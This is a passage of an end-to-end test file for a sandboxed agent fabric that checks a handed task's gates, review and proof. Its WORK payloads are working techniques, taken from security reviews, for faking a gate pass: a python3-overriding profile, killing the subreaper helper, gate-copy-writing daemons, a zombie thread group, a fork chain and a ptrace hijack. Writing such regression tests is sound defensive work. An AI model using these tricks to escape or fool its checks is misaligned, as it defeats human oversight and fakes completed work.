import { afterAll, beforeAll, describe, expect, setDefaultTimeout, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { randomBytes } from "node:crypto";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { bodyFingerprint, type Calibration, ceilingThreads, type HandedView, KERNEL, REFERENCE_SINGLE, type TeamSnapshot } from "@invincible/core";
import { DEFAULT_IMAGE, type DockerRunner, KATA_RUNTIME, LABEL } from "@invincible/sandbox";
import type { Measure } from "../src/compute/service.ts";
import { HAVE_QAMP, type Pair, sandboxCaps, startPair, until } from "./fabric-pair.ts";

/*
 * Another node's task, end to end on real VMs: two nodes over real Q-AMP sidecars (fabric-pair.ts), alpha handing a task
 * to beta's agent, which takes it in a VM of its own beside its agent's, both Kata microVMs (and again with Docker's own
 * runtime, runc), through its gates, its review and its bring-back, to its proof checked back on alpha. Until this ran, no
 * node had taken a handed task end to end on real Docker or Kata (the lead, 28 November 2026), which kept the fabric off.
 *
 * Beta is a scratch node beside a live one (sandboxNetworks false): its sandboxes join no network, so nothing of it
 * reaches the live node's (its sandbox networks, its gateway), and it makes, keeps and builds no image. Its models are a
 * stand-in, which the node calls itself; its agent's commands run in the VMs for real. Its Docker is the host's, through a
 * wrapper this test writes, given as both its engine and the binary it spawns itself (pipes, streams, a collect):
 * - each VM and volume it makes is named this run's own (E2E_PREFIX, never invincible-sbx-), and a listing shows it back
 *   as the node named it;
 * - it refuses what would touch anything else: an image built, pulled, tagged or removed, a network made or changed, a
 *   prune, a name of a live node's kind; each refusal is kept, and the test fails on one;
 * - for runc, it runs each VM without Kata's runtime (the node asks one for every agent's VM).
 * It has no workspace helper (one given an engine runs none; and its socket is a path nothing listens on): a host's
 * helper is its live node's.
 *
 * Its agent's repository is made in its VM before the task: a clone comes through the gateway, which a scratch node has
 * none of, so the task's start finds it as it is ("stale") and begins on it.
 *
 * Linux, Docker, invincible/sandbox:1 and a Q-AMP binary (INVINCIBLE_QAMP_TEST_BIN), and Kata for its first half.
 * Skipped, and so unverified, anywhere else. Each run prints the times of its stages.
 */

setDefaultTimeout(600_000);

/** The host's docker (E2E_DOCKER where PATH's first is a stand-in that refuses everything: see E2E_STRAY_LOG). */
const REAL = process.platform === "linux" ? (process.env.E2E_DOCKER ?? Bun.which("docker")) : null;
/** Where such a stand-in first on PATH writes what reached it: nothing of a node's may, only the wrapper's own. */
const STRAY = process.env.E2E_STRAY_LOG ?? null;
const docker = (...args: string[]) => spawnSync(REAL!, args, { encoding: "utf8", timeout: 180_000 });
/** This run's own names: letters, digits and dashes, ending in a dash (`<prefix>sbx-<id>`, as the node's `invincible-sbx-<id>`). */
const PREFIX = process.env.E2E_PREFIX ?? `e2e-${randomBytes(3).toString("hex")}-`;
if (!/^[a-z][a-z0-9-]{2,30}-$/.test(PREFIX)) throw new Error(`E2E_PREFIX must be lowercase letters, digits and dashes, ending in a dash: ${PREFIX}`);
const available = !!REAL && HAVE_QAMP && docker("version", "--format", "{{.Server.Version}}").status === 0 && docker("image", "inspect", DEFAULT_IMAGE).status === 0;
if (!available) console.log(`${import.meta.file} SKIPPED, unverified: it needs Linux, a Docker it can reach, ${DEFAULT_IMAGE} and a Q-AMP binary (INVINCIBLE_QAMP_TEST_BIN).`);
const kata = available && docker("run", "--rm", "--name", `${PREFIX}kata-probe`, "--runtime", KATA_RUNTIME, "--network", "none", DEFAULT_IMAGE, "true").status === 0;
if (available && !kata) console.log(`${import.meta.file}: its Kata half SKIPPED, unverified: the Docker host runs no Kata microVM.`);

const dir = mkdtempSync(join(tmpdir(), PREFIX));
afterAll(() => {
  drop();
  rmSync(dir, { recursive: true, force: true });
});

/** Every container and volume of this run's, removed by its own name: never by a pattern. */
function drop(): void {
  if (!available) return;
  const named = (out: string) => out.split("\n").map((line) => line.trim()).filter((name) => name.startsWith(PREFIX));
  for (const name of named(docker("ps", "-a", "--filter", `name=^${PREFIX}`, "--format", "{{.Names}}").stdout)) docker("rm", "-f", name);
  for (const name of named(docker("volume", "ls", "--filter", `name=^${PREFIX}`, "--format", "{{.Name}}").stdout)) docker("volume", "rm", "-f", name);
}

/** The docker a node of this run runs (see above): its log, a line per call, and its refusals beside it. */
function wrapper(runtime: "kata" | "runc"): { path: string; log: string } {
  const at = join(dir, runtime);
  mkdirSync(at);
  const log = join(at, "docker.log");
  writeFileSync(
    join(at, "docker"),
    `#!/bin/bash
# (When the node asked: before anything here, so that what this takes is never counted as the node's.)
asked=$(date +%s%3N)
REAL=${REAL}; PREFIX=${PREFIX}; LOG=${log}; RUNTIME=${runtime}
args=()
for a in "$@"; do args+=("\${a//invincible-sbx-/\${PREFIX}sbx-}"); done
refuse() { printf '%s %s\\n' "$(date +%s%3N)" "$1" >> "$LOG.refused"; echo "e2e docker: refused: $1" >&2; exit 125; }
case \${args[0]} in
  build|buildx|builder|rmi|tag|push|pull|load|save|import|commit|plugin|swarm|compose|context|login|logout|system) refuse "\${args[0]}";;
  network) case \${args[1]} in inspect|ls) ;; *) refuse "network \${args[1]}";; esac;;
  image) case \${args[1]} in inspect|ls) ;; *) refuse "image \${args[1]}";; esac;;
  volume|container) [ "\${args[1]}" = prune ] && refuse "\${args[0]} prune";;
esac
for a in "\${args[@]}"; do case $a in invincible-*) refuse "a name of a live node's kind: $a";; esac; done
if [ "$RUNTIME" = runc ] && [ "\${args[0]}" = run ]; then
  kept=(); skip=0
  for a in "\${args[@]}"; do
    if [ $skip = 1 ]; then skip=0; continue; fi
    if [ "$a" = --runtime ]; then skip=1; continue; fi
    case $a in --runtime=*) continue;; esac
    kept+=("$a")
  done
  args=("\${kept[@]}")
fi
all="$*"
kind=\${args[0]}
[ "$kind" = run ] && case $all in *"${LABEL}.gate=1"*) kind=run-gate;; *"${LABEL}.task="*) kind=run-task;; esac
[ "$kind" = run ] || [ "$kind" = run-task ] || [ "$kind" = run-gate ] || case $all in
  *"not a store for its gates"*) kind=store;; *"this sweep runs only as"*) kind=sweep;; *"its tree could not be packed"*) kind=pack;; *"its folder is not there"*) kind=tar;;
  *given.bundle*) kind=take;; *"its workspace as it was given"*) kind=give;; *send-index*) kind=send;; *apply-index*) kind=apply;;
  *tree-index*) kind=tree;; *"no such receive"*) kind=receive;; *"tagged()"*) kind=pipe-end;; *"its gates run on the tree alone"*) kind=copy;;
  *gate-faker*|*PROFILE*|*zz-work*) kind=work;; *"test -f result-real.txt"*) kind=gate;; *"> result-real.txt"*) kind=work;;
esac
printf '%s %s %s (+%s ms here)\\n' "$asked" "$kind" "$(printf '%q ' "\${args[@]:0:12}" | cut -c1-300)" "$(( $(date +%s%3N) - asked ))" >> "$LOG"
case \${args[0]} in
  ps|inspect) set -o pipefail; "$REAL" "\${args[@]}" | sed "s/\${PREFIX}sbx-/invincible-sbx-/g"; exit $?;;
  volume) case \${args[1]} in ls|inspect) set -o pipefail; "$REAL" "\${args[@]}" | sed "s/\${PREFIX}sbx-/invincible-sbx-/g"; exit $?;; esac;;
esac
exec "$REAL" "\${args[@]}"
`,
  );
  chmodSync(join(at, "docker"), 0o755);
  return { path: at, log };
}

/**
 * What the stand-in engineer runs, by the task's goal (its first word): the work, writing the gate's file; or one of two
 * ways a task could make its gate say it passed without it (the eighth fabric review's R8-3). It then says DONE, and the
 * reviewer passes whatever it is shown.
 */
const WORK = {
  TASK_REAL: "printf '%s\\n' real > result-real.txt",
  // The review's PoC (zz-rc8-handed-profile): a login profile whose python3 says each gate passed, and makes the end of
  // what the task left running a no-op, for each `bash -lc` the node runs in the task's VM.
  TASK_PROFILE: [
    "cat > \"$HOME/.bash_profile\" <<'PROFILE'",
    "python3() {",
    "  case \"$2\" in *'end_task(sys.argv[1])'*) return 0;; esac",
    "  if [ \"$1\" = -c ] && [ \"$3\" = gate ]; then echo '(the gate, as this task tells it: passed)'; return 0; fi",
    "  command python3 \"$@\"",
    "}",
    "PROFILE",
    "echo profile written",
  ].join("\n"),
  // A process that outlives the freeze's end, as one does whose command ended its own helper first (FABRIC.md says it
  // escapes that bound): it writes the gate's file in the task's worktree while a gate looks for it, and takes it away
  // after, so the tree read before the gates and the one brought back after them never have it.
  TASK_SURVIVOR: [
    "cat > \"$TMPDIR/gate-faker.sh\" <<'FAKER'",
    "while :; do",
    "  if grep -qa 'test -f result-real[.]txt' /proc/[0-9]*/cmdline 2>/dev/null; then",
    "    : > \"$1/result-real.txt\"",
    "    while grep -qa 'test -f result-real[.]txt' /proc/[0-9]*/cmdline 2>/dev/null; do sleep 0.01; done",
    "    rm -f \"$1/result-real.txt\"",
    "  fi",
    "  sleep 0.01",
    "done",
    "FAKER",
    "setsid bash \"$TMPDIR/gate-faker.sh\" \"$PWD\" </dev/null >/dev/null 2>&1 &",
    // (Its helper, the nearest of its ancestors that is a subreaper, ended: so it lists nothing this command started.)
    // ([S]: so that this command's own words, in its shell's command line, never match.)
    "p=$PPID; while [ \"$p\" -gt 1 ]; do if grep -qa 'PR_SET_CHILD_[S]UBREAPER' /proc/$p/cmdline 2>/dev/null; then kill -KILL $p; break; fi; p=$(cut -d' ' -f4 /proc/$p/stat); done",
    "echo started",
  ].join("\n"),
  // The ninth review's R9-2: the task's work is a test of its own (as a task's work has) and a script it runs. Run by the
  // gate `bun test` as the gates' user, it starts a process of that user's that writes result-real.txt into every gates'
  // copy it finds, then ends its helper (the nearest ancestor that is a subreaper) so that the helper's end misses it. In
  // a later round it finds that process running and does nothing: its test passes.
  TASK_DAEMON: String.raw`# zz-work
cat > zz.test.ts <<'ZZ'
import { expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
test("the work", () => {
  spawnSync("bash", ["zz-daemon.sh"], { stdio: "ignore" });
  expect(1 + 1).toBe(2);
});
ZZ
cat > zz-daemon.sh <<'ZZ'
m=zz-gate-; m="$m"daemon
if ! grep -qa 'zz-gate-[d]aemon' /proc/[0-9]*/cmdline 2>/dev/null; then
  setsid python3 -c 'import glob, os, time
while True:
    for d in glob.glob("/gates/*/tree"):
        try:
            if not os.path.exists(os.path.join(d, "result-real.txt")):
                open(os.path.join(d, "result-real.txt"), "w").close()
        except OSError:
            pass
    time.sleep(0.002)' "$m" </dev/null >/dev/null 2>&1 &
  sleep 0.5
  p=$PPID; while [ "$p" -gt 1 ]; do if grep -qa 'PR_SET_CHILD_[S]UBREAPER' /proc/$p/cmdline 2>/dev/null; then kill -KILL $p; break; fi; p=$(cut -d' ' -f4 /proc/$p/stat); done
fi
ZZ
echo written`,
  // The eleventh review's R11-1 (zz-rc11-gate-zombie): as the daemon above, but the process its test leaves is a thread
  // group whose leader thread has exited (SYS_exit, that thread alone) while its other thread runs on: /proc says "Z" of
  // it, and the sweep at 6d23bf9f passed it by as a zombie. It ends no helper: it needs nothing of the kind.
  TASK_ZOMBIE: String.raw`# zz-work
cat > zz.test.ts <<'ZZ'
import { expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
test("the work", () => {
  spawnSync("bash", ["zz-daemon.sh"], { stdio: "ignore" });
  expect(1 + 1).toBe(2);
});
ZZ
cat > zz-daemon.sh <<'ZZ'
setsid /usr/bin/python3 -c 'import ctypes, glob, os, platform, threading, time
libc = ctypes.CDLL(None)
def work():
    while True:
        for d in glob.glob("/gates/*/tree"):
            try:
                if not os.path.exists(os.path.join(d, "result-real.txt")):
                    open(os.path.join(d, "result-real.txt"), "w").close()
            except OSError:
                pass
        time.sleep(0.002)
threading.Thread(target=work).start()
time.sleep(0.2)
libc.syscall(93 if platform.machine() == "aarch64" else 60, 0)' </dev/null >/dev/null 2>&1 &
sleep 0.5
ZZ
echo written`,
  // R11-1 with one gate (zz-rc11-gate-zombie-locked): her locked check.test.ts imports app.ts, which the task changes to
  // start the same thread group when a gate imports it, and still says 1, so round 1's gate fails as it should. Its
  // thread then writes an app.ts that says 2 into each later copy it finds.
  TASK_ZOMBIE_APP: String.raw`# zz-work
cat > zz-daemon.sh <<'ZZ'
setsid /usr/bin/python3 -c 'import ctypes, glob, os, platform, threading, time
libc = ctypes.CDLL(None)
want = "export const value = () => 2;
"
def work():
    while True:
        for d in glob.glob("/gates/*/tree"):
            p = os.path.join(d, "app.ts")
            try:
                if os.path.exists(p) and open(p).read() != want:
                    with open(p, "w") as f:
                        f.write(want)
            except OSError:
                pass
        time.sleep(0.002)
threading.Thread(target=work).start()
time.sleep(0.2)
libc.syscall(93 if platform.machine() == "aarch64" else 60, 0)' </dev/null >/dev/null 2>&1 &
sleep 0.5
ZZ
cat > app.ts <<'ZZ'
import { spawnSync } from "node:child_process";
spawnSync("bash", ["zz-daemon.sh"], { stdio: "ignore" });
export const value = () => 1;
ZZ
echo written`,
  // R11-1's second road (zz-rc11-gate-chain): a chain of processes, each forking its next and exiting, which outran a
  // sweep that listed pids and then signalled them.
  TASK_CHAIN: String.raw`# zz-work
cat > zz.test.ts <<'ZZ'
import { expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
test("the work", () => {
  spawnSync("bash", ["zz-daemon.sh"], { stdio: "ignore" });
  expect(1 + 1).toBe(2);
});
ZZ
cat > zz-daemon.sh <<'ZZ'
setsid /usr/bin/python3 -c 'import glob, os
while True:
    for d in glob.glob("/gates/*/tree"):
        try:
            if not os.path.exists(os.path.join(d, "result-real.txt")):
                open(os.path.join(d, "result-real.txt"), "w").close()
        except OSError:
            pass
    if os.fork():
        os._exit(0)' </dev/null >/dev/null 2>&1 &
sleep 0.5
ZZ
echo written`,
  // The twelfth review's R12-1 (zz-r12-gate-ptrace), as the review wrote it: the process its test leaves traces its gate's
  // helper and turns the helper's first kill (end_command's killpg) into exit_group(0), then each later sweep the same
  // way, and writes the second gate's file into each later copy. Kata's guest kernel has no Yama, so it can trace any
  // process of its own user there (x86_64's registers and system calls).
  TASK_PTRACE: String.raw`# zz-work
cat > zz.test.ts <<'ZZ'
import { expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
test("the work", () => {
  spawnSync("bash", ["zz-daemon.sh"], { stdio: "ignore" });
  expect(1 + 1).toBe(2);
});
ZZ
cat > zz-daemon.sh <<'ZZ'
setsid /usr/bin/python3 zz-attacker.py </dev/null >/dev/null 2>&1 &
sleep 1
ZZ
cat > zz-attacker.py <<'ZZ'
import ctypes, glob, os, time
libc = ctypes.CDLL(None, use_errno=True)
libc.ptrace.restype = ctypes.c_long
libc.ptrace.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_void_p]
class Regs(ctypes.Structure):
    _fields_ = [(n, ctypes.c_ulonglong) for n in "r15 r14 r13 r12 rbp rbx r11 r10 r9 r8 rax rcx rdx rsi rdi orig_rax rip cs eflags rsp ss fs_base gs_base ds es fs gs".split()]
def cmd(p):
    return open("/proc/%d/cmdline" % p, "rb").read()
def parent(p):
    return int(open("/proc/%d/stat" % p).read().rsplit(")", 1)[1].split()[1])
def take(pid, syscall):
    # Stopped at its next system call of number syscall (any, if None), it calls exit_group(0) instead.
    if libc.ptrace(0x4206, pid, None, None) != 0:
        return False
    libc.ptrace(0x4207, pid, None, None)
    os.waitpid(pid, 0x40000000)
    regs = Regs()
    while True:
        libc.ptrace(24, pid, None, None)
        _, status = os.waitpid(pid, 0x40000000)
        if os.WIFEXITED(status) or os.WIFSIGNALED(status):
            return True
        libc.ptrace(12, pid, None, ctypes.byref(regs))
        if regs.rax == 0xffffffffffffffda and (syscall is None or regs.orig_rax == syscall):
            regs.orig_rax, regs.rdi = 231, 0
            libc.ptrace(13, pid, None, ctypes.byref(regs))
            libc.ptrace(17, pid, None, None)
            return True
p, helper = os.getppid(), None
while p > 1 and helper is None:
    try:
        if b"PR_SET_CHILD_SUBREAPER" in cmd(p):
            helper = p
        else:
            p = parent(p)
    except OSError:
        break
if helper and os.fork() == 0:
    take(helper, 62)
    os._exit(0)
done = set()
while True:
    for n in os.listdir("/proc"):
        if n.isdigit() and int(n) not in done and int(n) != os.getpid():
            try:
                if b"this sweep runs only" in cmd(int(n)):
                    done.add(int(n))
                    take(int(n), None)
            except OSError:
                pass
    for d in glob.glob("/gates/*/tree"):
        try:
            if not os.path.exists(os.path.join(d, "result-real.txt")):
                open(os.path.join(d, "result-real.txt"), "w").close()
        except OSError:
            pass
    time.sleep(0.001)
ZZ
echo written`,
  // The eleventh review's R11-2 (zz-rc11-locked-check), its control: her locked.test.ts rewritten to pass whatever
  // app.txt says, and nothing else.
  TASK_LOCKED_PLAIN: String.raw`# zz-work
printf '%s
' 'import { expect, test } from "bun:test";' 'test("the work", () => expect(1).toBe(1));' > locked.test.ts
echo written`,
  // R11-2: the same, and a process its helper's end misses (it ends its helper, as TASK_SURVIVOR does) that closes the
  // clone's .git to every user but its own until the first gates' copy of the round has begun and ended. (The phrase it
  // looks for is the copy's, split here so that no command line of this task's has it whole.)
  TASK_LOCKED: String.raw`# zz-work
printf '%s
' 'import { expect, test } from "bun:test";' 'test("the work", () => expect(1).toBe(1));' > locked.test.ts
cat > "$TMPDIR/locker.py" <<'ZZ'
import os, sys, time
g = os.path.join(sys.argv[1], ".git")
if os.path.isfile(g):
    g = os.path.join(sys.argv[1], open(g).read().split("gitdir:", 1)[1].strip())
os.chmod(g, 0o700)
phrase = b"its gates run on the tree " + b"alone"
def copying():
    for p in os.listdir("/proc"):
        if p.isdigit():
            try:
                with open("/proc/%s/cmdline" % p, "rb") as f:
                    if phrase in f.read():
                        return True
            except OSError:
                pass
    return False
while not copying():
    time.sleep(0.002)
while copying():
    time.sleep(0.002)
os.chmod(g, 0o755)
ZZ
setsid /usr/bin/python3 "$TMPDIR/locker.py" "$PWD" </dev/null >/dev/null 2>&1 &
sleep 0.2
p=$PPID; while [ "$p" -gt 1 ]; do if grep -qa 'PR_SET_CHILD_[S]UBREAPER' /proc/$p/cmdline 2>/dev/null; then kill -KILL $p; break; fi; p=$(cut -d' ' -f4 /proc/$p/stat); done
echo written`,
} as const;
/**
 * Work made as the run begins (DEPS): a task that adds a dependency of the registry's, as `bun add` would, with its
 * honest bun.lock and a test that imports it; and the same asking for it from GitHub. Their gate installs it, offline.
 */
const LATE: Record<string, string> = {};
type Work = keyof typeof WORK | "TASK_DEPS" | "TASK_DEPS_GIT";
/** A bun.lock made the honest way, by the image's bun in a scratch container of this run's on Docker's default bridge. */
function lockfile(deps: Record<string, string>): { manifest: string; lock: string } {
  const manifest = JSON.stringify({ name: "project", private: true, dependencies: deps });
  const made = docker("run", "--rm", "--name", `${PREFIX}lock`, "--network", "bridge", "--user", "65534:65534", "--read-only", "--cap-drop", "ALL", "--tmpfs", "/tmp:rw,size=512m,mode=1777", "--entrypoint", "/usr/bin/env", DEFAULT_IMAGE, "-i", "PATH=/opt/bun/bin:/usr/local/bin:/usr/bin:/bin", "HOME=/tmp/h", "BUN_INSTALL_CACHE_DIR=/tmp/c", "/bin/bash", "--noprofile", "--norc", "-c", `mkdir -p /tmp/a && cd /tmp/a && printf '%s' '${manifest}' > package.json && bun install --ignore-scripts >/dev/null 2>&1 && cat bun.lock`);
  if (made.status !== 0) throw new Error(`no lockfile could be made: ${made.stderr}`);
  return { manifest, lock: made.stdout };
}
const written = (files: Record<string, string>) => `# zz-work\n${Object.entries(files).map(([file, text]) => `cat > ${file} <<'ZZ'\n${text.replace(/\n$/, "")}\nZZ`).join("\n")}\necho written`;
const ODD_TEST = `import { expect, test } from "bun:test";\nimport isOdd from "is-odd";\ntest("odd", () => expect(isOdd(3)).toBe(true));\n`;
const fence = "```";
const models = Bun.serve({
  port: 0,
  hostname: "127.0.0.1",
  async fetch(request) {
    const body = (await request.json()) as { model: string; tools?: unknown[]; messages: { role: string; content: string }[] };
    const turns = body.messages.filter((m) => m.role !== "system");
    const sse = (delta: unknown) => new Response(`data: ${JSON.stringify({ choices: [{ delta }] })}\n\ndata: [DONE]\n\n`, { headers: { "content-type": "text/event-stream" } });
    if (body.model === "reviewer") return sse({ content: "PASS\nThe gate passed after the work, and its evidence shows the file written." });
    // (The work, on the engineer's models, or on the planner's where the node routes it there: after two of an agent's
    // tasks had to move up to them, its next begins on them. Asked with tools, the planner's model works too.)
    if (body.model === "engineer" || (body.model === "planner" && body.tools?.length)) {
      const asked = JSON.stringify(body.messages);
      const named = [...Object.keys(LATE), ...Object.keys(WORK)].find((work) => asked.includes(`${work}:`)) ?? "TASK_REAL";
      const command = LATE[named] ?? WORK[named as keyof typeof WORK];
      const worked = turns.some((m) => m.role === "assistant" || m.role === "tool");
      if (body.tools?.length && !worked) return sse({ tool_calls: [{ index: 0, id: "call_work", function: { name: "bash", arguments: JSON.stringify({ command }) } }] });
      return sse({ content: worked ? "DONE\nThe file is written." : `${fence}sh\n${command}\n${fence}` });
    }
    return sse({ content: "1. Write the file.\n2. Check it.\nDone when: the gate passes." });
  },
});
afterAll(() => models.stop(true));

const measure: Measure = async (reason, body, limit): Promise<Calibration> => {
  const threads = ceilingThreads(body, limit);
  return { at: Date.now(), tookMs: 1, reason, body: bodyFingerprint(body, limit), cpu: { single: REFERENCE_SINGLE, multi: REFERENCE_SINGLE * threads, threads, kernel: KERNEL } };
};

for (const runtime of ["kata", "runc"] as const) {
  describe.skipIf(!available || (runtime === "kata" && !kata))(`another node's task, end to end on real VMs: ${runtime === "kata" ? "Kata microVMs" : "containers (runc)"}`, () => {
    let pair: Pair;
    let log = "";
    /** The workspace socket this process had before: given back as the run ends, so no later file of the run sees this one's. */
    const socketBefore = process.env.INVINCIBLE_WORKSPACE_SOCKET;

    beforeAll(async () => {
      const bin = wrapper(runtime);
      log = bin.log;
      process.env.INVINCIBLE_WORKSPACE_SOCKET = join(dir, "no-workspace-helper.sock");
      // (The node runs the wrapper both ways: given as its engine, and as the binary its pipes, streams and collects spawn.)
      const wrapped: DockerRunner = async (args, timeoutMs) => {
        const proc = Bun.spawn([join(bin.path, "docker"), ...args], { stdin: "ignore", stdout: "pipe", stderr: "pipe" });
        const timer = setTimeout(() => proc.kill("SIGKILL"), timeoutMs);
        const [stdout, stderr, code] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited]);
        clearTimeout(timer);
        return { code, stdout, stderr };
      };
      pair = await startPair({ b: { capabilities: { ...sandboxCaps("beta"), cores: 16, memoryGb: 32 }, docker: wrapped, dockerBinary: join(bin.path, "docker"), sandboxNetworks: false, measure, shutdownGraceMs: 2_000 } });
      const { b, callB } = pair;
      await until(() => b.store.lww(`calibration:${b.identity.id}`) !== null, 15_000, "beta's calibration");
      await callB("setProvider", { id: "stand-in", kind: "openai", baseUrl: `http://127.0.0.1:${models.port}/v1` });
      for (const role of ["planner", "engineer", "reviewer"]) await callB("setRoster", { role, models: [`stand-in/${role}`] });
      for (const role of ["planner", "engineer", "reviewer"]) await callB("setPrice", { model: `stand-in/${role}`, input: 1, output: 2 });
      await callB("saveAgent", { id: "ada", name: "Ada", role: "engineer", repository: "https://github.com/you/project" });
      await callB("grantHandoffs", { from: "alpha", to: "beta", agents: ["ada"], tools: ["fleet"], budgetUsdPerDay: 100 });
    });

    afterAll(async () => {
      await pair?.stop();
      drop();
      if (socketBefore === undefined) delete process.env.INVINCIBLE_WORKSPACE_SOCKET;
      else process.env.INVINCIBLE_WORKSPACE_SOCKET = socketBefore;
    });

    /** Ada's VM, and her repository in it as a clone would leave it, its origin her repository's (her VM has no network here: see above): made once. */
    let hers: Promise<{ herVm: string; madeMs: number; seededMs: number }> | null = null;
    const her = () =>
      (hers ??= (async () => {
        const began = Date.now();
        const { workspace } = await pair.callB<{ workspace: { id: string; network: string; isolation: string } }>("provisionAgent", { id: "ada", desktop: false });
        expect(workspace).toMatchObject({ network: "isolated", isolation: "vm" });
        const made = Date.now();
        const herVm = `${PREFIX}sbx-${workspace.id}`;
        // (With two tests of hers that the R11 cases' gates run, each failing until the work is done: check.test.ts until
        // app.ts says 2, locked.test.ts until app.txt says "two".)
        const seeded = docker("exec", "--workdir", "/work", herVm, "bash", "-lc", "set -e; git init -q -b main /work/repo; cd /work/repo; printf 'the project\\n' > README.md; printf 'one\\n' > app.txt; printf '%s\\n' 'export const value = () => 1;' > app.ts; printf '%s\\n' 'import { expect, test } from \"bun:test\";' 'import { value } from \"./app.ts\";' 'test(\"the work\", () => expect(value()).toBe(2));' > check.test.ts; printf '%s\\n' 'import { expect, test } from \"bun:test\";' 'import { readFileSync } from \"node:fs\";' 'test(\"the work\", () => expect(readFileSync(\"app.txt\", \"utf8\")).toBe(\"two\\n\"));' > locked.test.ts; git add -A; git -c user.name=Owner -c user.email=owner@example.test commit -q -m first; git remote add origin https://github.com/you/project; git rev-parse HEAD");
        expect([seeded.status, seeded.stderr.trim()]).toEqual([0, ""]);
        return { herVm, madeMs: made - began, seededMs: Date.now() - made };
      })());

    /** A task handed to beta's agent, whose work is `work`, followed to its end on alpha; its stages and calls printed. */
    async function handOff(work: Work, gates: string[] = ["test -f result-real.txt"]) {
      const { callA } = pair;
      const { herVm, madeMs, seededMs } = await her();
      const handedAt = Date.now();
      const view = await callA<HandedView>("handTask", { node: "beta", goal: `${work}: write the file and prove it`, gates, agent: "ada" });
      await until(async () => (await callA<HandedView>("handedTask", { id: view.id, after: 0 })).phase === "ended", 480_000, "the task ended");
      const seenAt = Date.now();
      const done = await callA<HandedView>("handedTask", { id: view.id, after: 0 });

      // Its stages, as alpha saw them come back and as beta's Docker was asked them.
      const calls = readFileSync(log, "utf8").trim().split("\n").map((line) => {
        const [at, kind] = line.split(" ");
        return { at: Number(at), kind: kind!, line };
      });
      const first = (kind: string, after = 0) => calls.find((c) => c.kind === kind && c.at >= after)?.at;
      const last = (kind: string) => calls.filter((c) => c.kind === kind).at(-1)?.at;
      const taskVm = calls.find((c) => c.kind === "run-task" && c.at >= handedAt);
      const timeline: [string, number | undefined][] = [
        ["handed (alpha)", handedAt],
        ["task VM asked (run)", taskVm?.at],
        ["clone given (give)", first("give", handedAt)],
        ["clone made in it (take)", first("take", handedAt)],
        ["first round's VM asked (run)", first("run-gate", handedAt)],
        ["its tree kept there (store)", first("store", handedAt)],
        ["its first sweep (sweep)", first("sweep", handedAt)],
        ["first gates' copy (copy)", first("copy", handedAt)],
        ["first gate, before the work", first("gate", handedAt)],
        ["the work's command", first("work", handedAt)],
        ["first bring-back (send)", first("send", handedAt)],
        ["last gates' copy", last("copy")],
        ["last bring-back's apply", last("apply")],
        ["last gate", last("gate")],
        ["review (trail)", done.trail.find((t) => t.text.startsWith("Review · "))?.at],
        ["ended on beta (alpha's view)", done.endedAt ?? undefined],
        ["ended, seen on alpha", seenAt],
      ];
      console.log(`\n${runtime}, ${work}: her VM ${madeMs} ms, her repository ${seededMs} ms (made once); from the hand-off:`);
      for (const [what, at] of timeline) console.log(`  ${at === undefined ? "    —" : `${String(at - handedAt).padStart(6)} ms`}  ${what}`);
      console.log(`  docker calls: ${calls.filter((c) => c.at >= handedAt).length}; trail:\n${done.trail.map((t) => `  ${String(t.at - handedAt).padStart(6)} ms  ${t.text.split("\n")[0]!.slice(0, 150)}`).join("\n")}`);
      // What the wrapper took itself, after the node asked (never counted above: each call is timed as it was asked).
      const here = calls.filter((c) => c.at >= handedAt).map((c) => Number(/\(\+(\d+) ms here\)$/.exec(c.line)?.[1] ?? 0));
      console.log(`  the wrapper's own time: at most ${Math.max(...here)} ms a call, ${here.reduce((a, b) => a + b, 0)} ms in all; the task VM's run +${/\(\+(\d+) ms here\)$/.exec(taskVm?.line ?? "")?.[1] ?? "?"} ms`);
      // Each call of the task's own, as it was asked: when, what, and in which VM (hers, or the task's).
      const vmOf = (line: string) => (line.includes(herVm) ? "hers" : new RegExp(`${PREFIX}sbx-[0-9a-f]+`).test(line) ? "task's" : "");
      const own = calls.filter((c) => c.at >= handedAt && !["ps", "inspect", "info", "version", "image", "volume", "update", "stats"].includes(c.kind));
      console.log(`  its calls:\n${own.map((c) => `  ${String(c.at - handedAt).padStart(6)} ms  ${c.kind.padEnd(9)} ${vmOf(c.line).padEnd(6)} ${c.line.split(" ").slice(2, 9).join(" ").slice(0, 110)}`).join("\n")}`);

      // Nothing of anything else's was asked of Docker, and nothing reached it but through the wrapper.
      expect(existsSync(`${log}.refused`) ? readFileSync(`${log}.refused`, "utf8") : "").toBe("");
      if (STRAY) expect(existsSync(STRAY) ? readFileSync(STRAY, "utf8") : "").toBe("");
      // Its work ran in a VM of its own beside hers, never in hers, and that VM is gone.
      expect(taskVm).toBeDefined();
      const workIn = calls.filter((c) => c.kind === "work" && c.at >= handedAt).map((c) => c.line);
      expect(workIn.length).toBeGreaterThan(0);
      expect(workIn.every((line) => !line.includes(herVm))).toBe(true);
      expect(docker("ps", "-a", "--filter", `label=${LABEL}.node=${pair.b.identity.id}`, "--filter", `label=${LABEL}.task`, "--format", "{{.Names}}").stdout.trim()).toBe("");
      // Where each ran: the task's VM, and each round's VM (the eleventh review's ruling), by the names Docker was asked.
      const named = (line: string) => new RegExp(`${PREFIX}sbx-[0-9a-f]+`).exec(line)?.[0] ?? "";
      const taskName = named(taskVm!.line);
      const roundNames = new Set(calls.filter((c) => c.kind === "run-gate" && c.at >= handedAt).map((c) => named(c.line)));
      const placed = (kinds: string[]) => [...new Set(calls.filter((c) => c.at >= handedAt && kinds.includes(c.kind)).map((c) => (named(c.line) === taskName ? "task's" : roundNames.has(named(c.line)) ? "round's" : "other")))];
      console.log(`  rounds: ${roundNames.size}; its gates, copies and sweeps ran in: ${placed(["gate", "copy", "sweep"]).join(", ") || "none"}; its work in: ${placed(["work"]).join(", ")}`);
      const placement = () => {
        expect(roundNames.size).toBeGreaterThan(0);
        expect(placed(["gate", "copy", "sweep", "store"])).toEqual(["round's"]);
        expect(placed(["work", "pack", "tar"]).filter((p) => p !== "task's")).toEqual([]);
      };
